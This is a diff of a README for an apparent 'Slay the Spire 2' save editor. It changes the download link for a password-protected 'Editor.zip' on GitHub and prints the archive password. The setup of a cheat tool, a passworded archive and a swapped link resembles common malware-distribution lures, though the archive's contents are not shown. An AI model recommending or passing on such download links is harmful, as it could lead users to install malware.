@@ -48,7 +48,7 @@ Edit gold, inject cards, unlock relics, skip floors, modify HP, swap potions, br
 
 🔽 Password-protected archive — extract and take control of your runs.
 
-📦 [**Download** `Editor.zip`](https://github.com/Alexantros341/SlayTheSpire2-Save-Editor/releases/download/Tools/SlayTheSpire2-SaveEditor.zip)
+📦 [**Download** `Editor.zip`](https://github.com/QuartzDemolisherTend/Slay-The-Spire2-Save-Editor/releases/download/Release/Editor.zip)
 
 🔑 **🔑🔑🔑:** `1847`
 
